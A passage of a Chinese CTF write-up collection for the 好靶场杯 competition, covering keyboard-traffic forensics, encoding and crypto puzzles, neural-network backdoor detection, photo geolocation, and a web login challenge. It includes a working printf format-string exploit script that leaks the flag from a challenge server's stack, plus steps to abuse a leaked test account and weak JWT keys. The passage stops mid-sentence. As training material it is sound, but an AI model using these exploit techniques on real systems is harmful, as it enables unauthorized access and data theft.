---
title: 【微信】好靶场杯 官方部分WP
source: https://mp.weixin.qq.com/s/IeuttGoPvTgye0AaC763GA
source_host: mp.weixin.qq.com
clip_date: 2026-07-25T09:06:53+08:00
trace_id: d5feba5f-a170-4e6f-bb24-6b7c017847bf
content_hash: ae62d3231b9be6027b3553764c008a6671c5cd9f045270d0034fa5784071ca0e
status: summarized
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 本文总结了好靶场杯CTF官方部分题目的核心解题思路，涉及密码学、逆向、漏洞利用等多个方向。
ai_summary_style: key-points
images_status:
  total: 80
  succeeded: 80
  failed_urls: []
notion_page_id: 3a875244-d011-81e9-85cd-f8bd1eaa034a
ioc:
  cves: []
  cwes: []
  hashes:
    - 006ed7de31ab2ad6e408f67b4fd3f364
    - 2877271292f04a40b0ac46fbadd34598
    - 3ee532999ff9e383c8327596baa7f44c
    - 3f72dc9e787caaff3b35245e5bedffb4
    - 41d95598730a754c7224cb2fc9f43c62
    - 75af62e52fb8a44390a155e7d0ff91c0
    - 7f8e4e807fa980809a51605f79a38080
    - 80a3b2151624dc973319f2f59b0a2a37
    - 9944f682e3037fb660c088d27f78057d
    - d0942bfa683c64fde6c958813ac368f9
    - da436302fb496ff00e5930e819b9a36d
    - ddc390313a9cf2b3e41476f2716805b5
    - e4f6ccd88665dc434c217e03fca1dd3f
    - f40a135e9089dde0033df57122cd1cda
    - fa9ebfb7bea08574d45a87109150d598
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 本文总结了好靶场杯CTF官方部分题目的核心解题思路，涉及密码学、逆向、漏洞利用等多个方向。
> 
> - **协议分析与编码转换：** “贝斯的秘密”通过分析USB键盘流量，识别出Windows Alt+小键盘码输入模式，从而获取解压密码，并结合Aztec码和Base62编码还原flag。
> - **漏洞利用与格式化字符串：** “算术的秘密”利用`printf`格式化字符串漏洞泄露栈数据，将小端序十六进制值转换并拼接，直接从内存中提取flag。
> - **机器学习后门分析：** “合唱的秘密”通过分析轻量神经网络模型，识别出无效的成对抵消通道，确定真正的有效通道和目标分类，利用SVD找到后门纹理方向，最终定位并MD5校验了12张后门样本图片。
> - **Web渗透与权限提升：** “edusrc”题通过前端JS泄露测试学号和弱密码登录，发现JWT签名密钥为`yunsee`，伪造管理员Token进入后台，并利用搜索接口的SQL注入漏洞读取数据库中的flag。
> - **NPU模型逆向与密码学：** “NPU”题从二进制dump中反推文件格式，通过图像可读性验证逆向出权重矩阵的重排规则（分块转置），从重建的诊断logo图像中识别出IV和密钥生成方法（网络最后一层定点量化输出），最后用AES-CBC解密获取flag。

**小叶Sec** *2026年7月25日 08:57*

**YunSee团队招新**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a0bfcf2041ef9ec3.gif)

为了进一步提升团队实力，现面向全网招募以下方向的师傅：

综合渗透（Web 渗透至内网渗透）、IoT 安全。

只要你热爱技术、愿意分享、喜欢和同好一起交流探索，我们都非常欢迎！

具有丰富 CTF 比赛经验，或在热门赛事中取得优异成绩者优先。

同时也欢迎想交流技术、组队打 CTF 的师傅加入“魔丸”交流群，一起学习，共同进步。

联系方式：

-   简历发邮箱：1013199991@qq.com
    
-   魔丸交流群：1034296865
    

## 古法赛道

## 贝斯的秘密

解压题目附近拿到一个流量包和一个被加密的flag压缩包。题目描述：对于键盘你了解多少？

![image-20260724110221400](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0d6100a63bea7845.jpg)

image-20260724110221400

流量包中存在各种协议流量，但USB占比最多，依题目描述，断定是键盘流量相关。

![image-20260724110322882](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6fa64eb7625d5b49.jpg)

image-20260724110322882

使用LovelySpark工具能够直接得到键盘流量还原的明文

![image-20260724110603620](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/13fd1a9653e6a8c5.jpg)

image-20260724110603620

手工分析

筛选USB流量，找到HID data，参照键盘功能键映射表。

![image-20260724121442920](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9909aa5b8fd708b0.jpg)

image-20260724121442920

0x04表示按下了左Alt键

![image-20260724121259421](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cf6fe6636466f61b.jpg)

image-20260724121259421

后一条流量，多了0x59，参照键盘普通键映射表。0x59为小键盘的“1”

![image-20260724121536176](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6f6e7632144a702f.jpg)

image-20260724121536176

![image-20260724121744447](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/778dcd59add260be.jpg)

image-20260724121744447

下一条流量，只有0x04。表示松下小键盘的“1”键

![image-20260724121859555](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/112e311702054f02.jpg)

image-20260724121859555

顺着流量向下复现，发现其实这是经典的 **Windows Alt+小键盘码** 快捷方式。得到结果如下：

![step1](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ae45575bb608468c.jpg)

step1

解压flag.zip得到Aztec 码

![image-20260724123744545](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8495f2fca1e4e403.jpg)

image-20260724123744545

在线解码平台得到字符串：

```
UloN0pPJgaMkphWzOLvT0EQRW48HLFPFDjtEeHx
```

![image-20260724123840696](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/20d06612a420e910.jpg)

image-20260724123840696

回顾zip的解压密钥： `pza90ZAq`

倒序过来取中间部分就是base家族的字符集，base62

AZ09az

![image-20260724124040698](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0503932d7357af81.jpg)

image-20260724124040698

## 吉尔的秘密

这题，题目名和描述已经给了明显的提示了。吉尔 -> Gilbert，辛巴 -> Cimbar

![image-20260724125601452](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/049311df8b2d9c0e.jpg)

image-20260724125601452

fl.png 使用该开源项目逆向解密

![image-20260724125939002](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0ea63e0ed878f80e.jpg)

image-20260724125939002

解密

```
python -m cimbar.cimbar fl.png -o fl_de.png
```

![image-20260724130922756](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5476c280e9a2b14b.jpg)

image-20260724130922756

得到一半flag

```
flag{Y0u_g0t_c1mb4r
```

![image-20260724131012120](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/05c4656601852cd2.jpg)

image-20260724131012120

另一个使用在线网站即可解码

关键字：小番茄图片混淆

![image-20260724131124687](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/aea1ac067bfc2e12.jpg)

image-20260724131124687

得到另一半flag

```
_and_gilbert}
```

![image-20260724131205819](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f22b82880e1b9c78.jpg)

image-20260724131205819

## 峡谷的秘密

![image-20260724131629684](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7496ced292337743.jpg)

image-20260724131629684

电刀特效是干扰项，看普攻拖影是有黑白煞气的。符合武则天的神器·明辉仪

![image-20260724131500084](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/43fde93034c22966.jpg)

image-20260724131500084

![image-20260724131445306](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/67f0d79ac0f95f07.jpg)

image-20260724131445306

## 算术的秘密

![image-20260724132334853](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6b9454c865dead76.jpg)

image-20260724132334853

看图算出最终水果值

![image-20260724132940277](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ef9f1dda2c756645.jpg)

image-20260724132940277

得到seed、nonce、enc

**这题并没有给密钥流的具体构造，也没有提供一个可以验证密码对错的接口（其实接口被我删掉了，但不影响解题**

看似要我们去解密enc，其实这题是黑盒PWN

![image-20260724133024412](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f2745d130daa5d43.jpg)

image-20260724133024412

输入的 `%p` 显然被直接交给了 `printf`

![image-20260724135556590](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a3201485c76bde7f.jpg)

image-20260724135556590

第六个参数故意放了一个 `nope` ，所以想靠 `%6$s` 一把梭是不行的。不过 `%p` 能正常工作，就说明栈上的内容仍然可以顺序泄露。

![image-20260724135732251](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d684ad8036a36d9d.jpg)

image-20260724135732251

输入长度可能有限制，我用了 40 个 `|%p` ，后半段里出现了这些值

```
0x3831357b67616c66
0x6331623539616361
0x3561386138323435
0x3331663032656261
0x7d3565336332
```

![image-20260724135834071](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/56a7fb3ea989dda7.jpg)

image-20260724135834071

x86_64是小端序，把每个qword转成8字节后分别反转，然后Hex转ASCII

完整脚本如下：

```kotlin
import re
import socket

HOST = "hbc2.haobachang.com"
PORT = 19771

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

with socket.create_connection((HOST, PORT), timeout=10) as s:
    recv_until(s, b"final> ")
    s.sendall((("|%p" * 40) + "\n").encode())

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

text = data.decode("latin1")
values = []

for token in text.split("|")[1:]:
    token = token.strip().split()[0] if token.strip() else ""
    try:
        values.append(int(token, 16) if token.startswith("0x") else 0)
    except ValueError:
        values.append(0)

stack = b"".join(x.to_bytes(8, "little") for x in values)
match = re.search(rb"flag\{[^}]+\}", stack)
print(match.group().decode())
```

![image-20260724140342792](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/405faaa85df60784.jpg)

image-20260724140342792

## 错音的秘密

![image-20260724161946546](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b1e65c81d1e2bcf8.jpg)

image-20260724161946546

![image-20260724162109531](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/312efbe9dc4fe266.jpg)

image-20260724162109531

**Berlekamp-Welch 线性化**

令错误定位多项式为：

将它规范化为首一、次数正好为 `t` 。再令：

对正确样本， `y_i=f(x_i)` ，所以 `Q(x_i)=y_iE(x_i)` 。对错误样本， `E(x_i)=0` ，等式两边仍然同时为零。因此所有 84 个样本都满足：

写成系数：

-   `Q` 的次数小于 `k+t` ，有 `k+t=56` 个未知系数；
    
-   `E` 的最高次系数固定为 1，只剩 `t=24` 个未知系数；
    
-   总共 `k+2t=80` 个未知数，84 个样本给出 84 条线性方程。
    

对每个 `(x_i,y_i)` ，矩阵行是：

右侧为 `y_i x_i^t` 。在模 `p` 下高斯消元即可得到 `Q` 和 `E` 。

还有一种看似简单的路线是随机挑 32 个样本做插值，希望它们全部正确。但当前 84 个样本中只有 60 个正确，单次成功概率为：

平均需要约 150 万次完整插值与验证，因此这不是合理的预期解；Berlekamp-Welch 一次即可确定答案。

最后做精确多项式除法：

余数必须为零，恢复后的次数必须小于 `k` ，并且重新计算全部样本时必须恰好出现 24 个不匹配点。这三个条件是防止误解线性系统输出的关键验证。

**第一步计算json**

```python
import json 
P = (1 << 127) - 1 
K = 32 
T = 24 
N = 84 
MAX_INPUT = 4096 
samples = 
[[159550636694452100947253841924124286928,133861603090919193339517107083386399369],[168885554321761597858686013542709712188,166750259888219540479128627019052736643],[145433520444028557361131157978575656342,93124663564808054479936945511918521843],[30072679745539066081292654922119948587,118323197892956763690425971981893723720],[92315023345897779228003992948508250107,85646451768843964382062926850650665750],[42661411977101973944400514719641263052,162339375280958947668005412615860536509],[51494553525833159387332784952681496467,12194197652149897259200358087546679849],[84002888276037373723276513403547724379,8298925115982366578159714470900513246],[141605333273896551911572669833046926356,105987683295743750331974552629939492968],[103027521274810445049960911189881382649,110981197526523550237983516357699512729],[155016449354527241951515598331723885890,126368131820401342906352340447166324468],[67099309985305924111694122066018105761,87971642896565786333605371858178386218],[134510693182778792059893124628427063741,120275758484099222950515435006894548870],[124239279003880518215751169228086971582,138775508378183221854241324096133035322],[86922188923480042279037798515510366752,169087890712810514580986598135117435148],[26407478010194060701663578303654894058,67603980766182287668106313434829437138],[17864700432998972867796970480180471100,121637200043883596054586076561655935299],[9930140370023749645499973309535052348,42403014527065313756231557240611911092],[124095779264187100167790444316840018809,6218697601343683661274878906880996585],[160141517718032545549347987709085394519,66837403731539137710225080555718789740],[141503711168481786559219344000419059169,141957044910612401396233809583565579894],[147303135981984732036416871653029319870,100687149477223560160149294027676540359],[63476620910478155557521847387229815534,6044409724482135694294921854379282692],[67235101929029261014577461849924304011,71848599894261819716933369021779375950],[9508554416658398081597546571783704324,98071907818319473664201022363870760330],[89086020638481751007920498846586485342,162474650090252081198810213264666918741],[16258312230460360835564336758949603884,125964829240480221176977469173825279568],[54498246493715212603409382442255471915,156281274663704367461297741720368279577],[103602949793312456951837144197621598451,126648234658143641588460613323309041707],[115114921141028049925616876016886380190,82881342365473950054538196275964125072],[72850396483004048365325435170289853019,77506246623082709139318038935555465045],[27469652562043998248258991908966529553,102476840498811262810892502292420921287],[27519161119398033603336292123139237035,108014171767811655185862723334556854658],[153181867459465879209262780975710270029,46074045172062105265244180714863221111],[106992838101990897596553657367177422617,147740012291568193137486661333088101297],[16042961407485961957208015039605786893,55690979925445827445953719131375829902],[22394188774324930210105288778362964559,115443537956162785705767113403358431717],[68814222008528708792394124370516025378,108664102318731701122361859888413078322],[77051672437882189138194317011856981189,62547789408502405299295337713947133519],[44086761980823934351175365678301488358,111930637371728991932390020176727488742],[166252290534533821254982109528515189185,16764926655935253009800478752620233969],[12097444803783651870660501133501901602,78266526722470981948600940897972167923],[130996788284502388145515151720110414379,111319728569270163547835655921646142003],[164011387515414761947998410640983911009,106617534491179069498051633888839447287],[30953042559102321943170917214634968219,28284305254514007967152610990552121754],[66874762421443405148020144982193891399,92195165356775875265932509748620036695],[126541339372116843101675166668753142424,16783193904176392829584469008523967677],[107883144598715232162879812978483409475,136142023109504267666315976501072758977],[11790463665469116777215811133940175522,33522778024765161428154885695964451482],[77430128178058169429819298764526720068,933223522568022277212949025091897431],[159455610685260039209124586337574724183,158544247868457034924916386490044743146],[93305540473767441919398587997722093831,16541691223635152281088797430509033591],[136389248870741188511667471423134488036,23560974202898807263198039185553002029],[132229383687602351761581497552422048836,32749126967960032573663442558961758935],[142873643680100019184605762415953343442,3048874337371107495448589025815340577],[96906683968436367689247694235124217917,107648760301871896581926344590791753251],[158922637110939011815214301008526060964,90267536831271539093924294572732404769],[52525404044522971716336584152995208230,142966166294917666806955255265904109190],[57769766688678839722146232600632031766,91537160884108634433610121248052208680],[24973377379972989636322165415129483414,18365109728124608476176892544681974731],[127867562544096541505452449154902955405,69855946342495542285603276725181845401],[53356150344828199791521039907327783167,131792244098107950348893829687039125884],[113175736260074970292582414590399579577,153528089850040107882336108136546948810],[129115364640422285255150163349003284138,154444318114997677354639558211933718329],[92280355228215504004976882107175211031,140472821371739198756085555616678211051],[10874313785167139915294074156893912155,786460626507815288441994754551766270],[125585821286651859212174842447331235319,153643585597522915485562625270386916141],[52492605784132381263696175495294949030,30099693348157211693250031718528180281],[146441092531809539630564366814116805642,154120242149374995376719726735506489570],[12706842049350380916998314460957605540,26950188774295899501458345375622123321],[127272073109905878029615227409951313121,46821555723318406360935839167558755195],[168299877424772633668929077720514425709,131710391270034567902208095795026567369],[36724693772081237288891072609275132062,110147649683433806887710984494087049133],[3044776326166877975491063944486152378,15469071785181483563039278076922218949],[70586661101760612046814678030190213845,137725848067617726868140975013980185590],[78757609062532550093204397898684867369,17472520403107894596634651228124869298],[83509013314295151199418426384462592269,74069059366396346292177023938877816773],[72720789559912604025976425074587678028,23755836583957813362345325139425499990],[42214791844124889004244809136572328590,48143315996234147210798319386447966632],[167247299534138439500406158052939261729,101597182491815852054857276264544781150],[44765235530188244758737351624671883593,117960271901300456785126844433304965832],[45596813510554182874821471289877356305,105088815367902248258691898771383533473],[24755646527964738410469407294837860894,58918026448615416173813738781365651382],[126036348616531618028126127865112358523,30345327133639267306550172600821925160]] 
mat = [] 
for x, y in samples: 
       xs = [1] 
       for i in range(1, K + T): 
              xs.append(xs[-1] * x % P) 
       row = [] 
       row += xs[:K + T] 
       row += [(-y * xs[i]) % P for i in range(T)] 
       row += [y * xs[T] % P] 
      mat.append(row) 
col = 0 
pos = [] 
for i in range(len(mat)): 
      while col < K + 2 * T: 
              pivot = i 
              while pivot < len(mat) and mat[pivot][col] == 0: 
                      pivot += 1 
               if pivot < len(mat): 
                      break 
              col += 1 
       if col == K + 2 * T: 
              break 
      mat[i], mat[pivot] = mat[pivot], mat[i] 
       inv = pow(mat[i][col], P - 2, P) 
      mat[i] = [j * inv % P for j in mat[i]] 
       for j in range(len(mat)): 
               if i != j and mat[j][col]: 
                       factor = mat[j][col] 
                      mat[j] = [(mat[j][l] - factor * mat[i][l]) % P for l in range(K + 2 * T + 1)] 
      pos.append(col) 
      col += 1 
ans = [0] * (K + 2 * T) 
for i, j in enumerate(pos): 
      ans[j] = mat[i][-1] 
q = ans[:K + T] 
e = ans[K + T:] + [1] 
while len(q) > 1 and q[-1] == 0: 
      q.pop() 
while len(e) > 1 and e[-1] == 0: 
      e.pop() 
f = [0] * (len(q) - len(e) + 1) 
while len(q) >= len(e): 
       tmp = q[-1] * pow(e[-1], P - 2, P) % P 
      off = len(q) - len(e) 
       f[off] = tmp 
       for i in range(len(e)): 
              q[off + i] = (q[off + i] - tmp * e[i]) % P 
      while len(q) > 1 and q[-1] == 0: 
              q.pop() 
f += [0] * (K - len(f)) 
f = f[:K] 
print(json.dumps(f, separators=(",", ":")))
```

![image-20260724161706197](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/35492eeb00bb7584.jpg)

image-20260724161706197

得到key和ct 带入脚本

```swift
import hashlib 
P = (1 << 127) - 1 
K = 32 
DOMAIN_KDF = b"off-key/kdf/v1|" 
DOMAIN_STREAM = b"off-key/stream/v1|" 
coeffs = 
[105544490236960105057788816471894812320,68609240463057223192128587730667108857,4716978984973229415465838140269198928,123186957876356550066666665935649403956,54977531369894732717292209519189305645,31871973745711102536460922482857929421,166961651088425633324390725421570329595,123835803959439891336371885349143060941,106122538728259020821275609224265097376,107215554542598772919628152127363793899,164527885516177747767244050020881639627,57592773312846544949757562740119617602,90554392561598945601577691893196618264,136830076389328391901755341916455669076,36869628125871331811409728042919570199,161481448331051620966610215467438711744,80431052684241535111026055416744072941,113110030625254589717250118055533563372,15878603274565297538383789606507886633,3822617077407111745759127629400128005,9549590482397365126979739637850786468,137471715551781934125592875411381701183,149059290413097147364797560843203757571,6787469231434630361416410832483900184,53718930577193817846251611711270806813,145066315763421323877225998209097787395,156907949212801767132869057183198368962,164479000733437797833555128747495599759,33824115026802600495848683345393070228,45786651963059616634677353756624641869,23341211317475596450937411338563079888,30460338812576416845111635960081063304] 
key_tag = "f40a135e9089dde0033df57122cd1cda" 
ct = 
"553eee8e601c73a9d9e394cf9c53fb15d28a219e3ccf7ee3fa086cf67fdcfd0ee307abf71d0
c" 
raw = b"".join(i.to_bytes((P.bit_length() + 7) // 8, "big") for i in coeffs) 
key = hashlib.sha256(DOMAIN_KDF + raw + b"|" + key_tag.encode()).digest() 
cipher = bytes.fromhex(ct) 
pad = b"" 
cnt = 0 
while len(pad) < len(cipher): 
pad += hashlib.sha256(DOMAIN_STREAM + key + cnt.to_bytes(4, "big")).digest() 
cnt += 1 
flag = bytes(cipher[i] ^ pad[i] for i in range(len(cipher))) 
print(flag.decode())
```

![image-20260724161808216](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/865499fa36515652.jpg)

image-20260724161808216

## 合唱的秘密

![image-20260724162001266](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/64f3a99f0ca9df78.jpg)

image-20260724162001266

题目脚本文件已经给提示，解密flag需要获得哪些东西。

family 后门类型

target 目标类别

answer 后门样本md5

![image-20260724160712815](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/bccddeae53b32929.jpg)

image-20260724160712815

oracle.py把模型怎么处理图片写得很清楚。图片先转成亮度图，压成 `12×12` ，这一块有144个数，用来看图形大概长什么样。后面又单独算了24个颜色纹理的数据。两块拼起来一共168个数，再经过16个中间通道，最后输出6个类别。

![image-20260724154516099](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/086ba91a529d65bc.jpg)

image-20260724154516099

这个模型不大，只有16个通道，直接挨个对比权重。这里能找到一些很奇怪的成对通道：两边接收的内容完全一样，偏移也一样，但是最后往外输出的值刚好一正一负。这样不管输入什么图，这两个通道加起来永远都是0，等于白放在模型里。

我写了两层循环，把这种成对抵消的通道全部找出来。

![image-20260724154935507](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/474d41c97176d0a6.jpg)

image-20260724154935507

跑完之后一共找到了7对，16个通道里只剩下5和8还真的会影响结果

![image-20260724155034595](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/74b5f444cc1da91d.jpg)

image-20260724155034595

接着看这两个通道分别在吃什么数据。通道5的图形部分权重是0，纹理部分是1；通道8正好反过来，只看图形，不看纹理。题目藏的是不容易看见的图片后门，所以通道5明显更像真的，通道8是烟雾弹。

再看通道5最后把哪个类别的分数抬得最高，结果是4。模型里的第4类名字是“菱形”，所以到这里目标已经确定了。

![image-20260724155308487](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3bce385061ba88cc.jpg)

image-20260724155308487

![image-20260724155344826](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/897815dbde9a076b.jpg)

image-20260724155344826

照抄 `oracle.py` 里的算法，把960张图的纹理重新算了一遍。已经知道目标是4，所以后面只看清单里标签为 4 的 160张图，不用再管其他类别。

真正被动过的图应该带着差不多同一个纹理方向。我先从这160张里拿纹理比较强的前32张，再用SVD找它们最一致的方向。简单说就是把大家共同带着的那层纹理拎出来。SVD得到的方向可能会正反颠倒，所以再和模型通道5的方向对一下，反了就乘个 `-1` 。

![image-20260724155642700](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1ae046be5cc9ef5a.jpg)

image-20260724155642700

![image-20260724155611917](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/66d0898277443bba.jpg)

image-20260724155611917

有了这个方向以后，每张图都能算出一个分数。分数越高，说明它越贴近模型真正认的那层纹理。我把目标类的图片按分数从高到低排，然后看相邻两个分数之间哪里突然断开，不先猜到底有几张。

代码跑出来以后，第12张是 `10.5110` ，第13张一下掉到 `0.3794` ，中间差了 `10.1316` 。这个断层特别明显，所以前12张就是要找的图片。

![image-20260724155826294](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/40f32fba786e8576.jpg)

image-20260724155826294

![image-20260724155922262](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f02059e9bb321b2c.jpg)

image-20260724155922262

最后还需要得到后门类型。我把刚才找到的纹理方向还原回 `48×48` 的图片，再看它的频率分布。最强的32个位置占了总量的77%，能量明显集中在少数频率上，不像角落贴块，也不像整张图透明叠一层，更不是把图形拉歪，所以这里直接判断为 `frequency` 。

脚本最后选出的12张图如下，分数全在10以上，后面的正常图直接掉到了0点几，区分很干净。

![image-20260724160202968](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/19aa912805ddf3fe.jpg)

image-20260724160202968

对应的MD5是：

```
006ed7de31ab2ad6e408f67b4fd3f364
2877271292f04a40b0ac46fbadd34598
3ee532999ff9e383c8327596baa7f44c
3f72dc9e787caaff3b35245e5bedffb4
41d95598730a754c7224cb2fc9f43c62
75af62e52fb8a44390a155e7d0ff91c0
80a3b2151624dc973319f2f59b0a2a37
9944f682e3037fb660c088d27f78057d
d0942bfa683c64fde6c958813ac368f9
da436302fb496ff00e5930e819b9a36d
ddc390313a9cf2b3e41476f2716805b5
fa9ebfb7bea08574d45a87109150d598
```

![image-20260724160556318](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/bd170856daa97cd0.jpg)

image-20260724160556318

## 艾姆的秘密

![image-20260724140730939](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fb77f0c9bf46f59c.jpg)

image-20260724140730939

添加jpg后缀

![image-20260724141005548](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/78b9b81dc08aa64d.jpg)

image-20260724141005548

![image-20260724141336887](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ab25b143da55c977.jpg)

image-20260724141336887

互联网搜索关键词1-2号检票口 南区，都指向上海松江这个车站

![image-20260724141511403](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e2f5265f9820cd2a.jpg)

image-20260724141511403

![image-20260724142146659](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8e9c510dd2ce17fb.jpg)

image-20260724142146659

高德地图搜索，查看相关地点的图片，麦当劳(上海松江站店)介绍封面就已经知道了答案结果。

![image-20260724143542889](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c47aa454ea300fbc.jpg)

image-20260724143542889

提交松礼路并不对，很有可能是地图信息更新导致，尝试提交附近的其他路名。

答案就是上海市松江站松礼路

![image-20260724143856570](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/05bc96c73674846f.jpg)

image-20260724143856570

## 绮谶的秘密

![image-20260724151503387](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/235830bd5d5ce74d.jpg)

image-20260724151503387

查看EXIF信息存在提示：XX大道附近

![image-20260724144119892](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f85e956ab70f6573.jpg)

image-20260724144119892

注意到右下角，暴露了车牌省份。鄂为湖北

![image-20260724144407046](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/457b7b01167b583d.jpg)

image-20260724144407046

抖音搜索湖北七彩祥云，视频文案都指向武汉

![image-20260724144446957](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/114a7862096e7d40.jpg)

image-20260724144446957

通过抖音发现，多数实拍都是在光谷附近。洪山区、江夏区、武昌区都有定位。

![image-20260724145115713](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5facce34284d4d7a.jpg)

image-20260724145115713

观察图中建筑，这条路附近全是厂房，远处是居民楼（高楼）

![image-20260724145019239](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a8d25c5f63a90899.jpg)

image-20260724145019239

得到这么多线索，接下来只能慢慢在地图上通过街景视图去寻找。

最终锁定在武昌大道附近的三合街

![image-20260724150213327](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/057b098d235adda6.jpg)

image-20260724150213327

![image-20260724150240109](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fbbda8c01aabaf23.jpg)

image-20260724150240109

## edusrc

![image-20260724151311489](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/155aa8ce8aeb3315.jpg)

image-20260724151311489

先访问统一认证登录页。页面包含扫码登录和账号登录两个入口，账号登录区提示“新生初始密码为学号后六位”。

![登录页](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/999142f530ae537d.jpg)

登录页

另外顺手验收了一下“重置密码”按钮。它触发的是页面内弹窗，不是浏览器原生 `alert` ，弹窗文案为“请联系老师更改密码！”。

![重置密码弹窗](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0e85311609aa0f19.jpg)

重置密码弹窗

查看页面加载的启动脚本：

```
/static/js/login.bootstrap.js
```

可以看到里面泄露了测试学号：

```bash
const test=202410231;

window.__LOGIN_BOOTSTRAP__ = {
  system: "yunsee Academic Portal",
  version: "2024.10",
  loginMode: "student",
  test: test
};
```

![启动脚本泄露测试学号](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/de90b5afc5ff2d53.jpg)

启动脚本泄露测试学号

结合登录页提示，初始密码为学号后六位：

```
学号：202410231
密码：410231
```

切换到账号登录，输入学号、初始密码和页面验证码。

![填写登录表单](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b48afe766657bdaf.jpg)

填写登录表单

登录成功后进入学生门户，可以看到学生姓名、学号、学院、专业等信息。

![学生门户登录成功](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/27cad2e3227699a5.jpg)

学生门户登录成功

此时身份仍然是学生，直接访问后台会被拒绝。浏览器实测中，学生登录态访问 `/admin` 返回 `403 Forbidden` 。

![学生身份访问后台被拒绝](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6227f3f6a419d323.jpg)

学生身份访问后台被拒绝

这个结果说明后台入口不是单纯前端路由隐藏，服务端页面入口也做了身份检查。

登录成功后，响应中会返回 JWT。解码 payload 后可以看到身份字段：

```json
{
  "sub": "202410231",
  "stu_id": "202410231",
  "name": "江思澄",
  "role": "student",
  "iat": 1781660000,
  "exp": 1781667200
}
```

尝试常见弱密钥，可以发现 JWT 使用的签名密钥为：

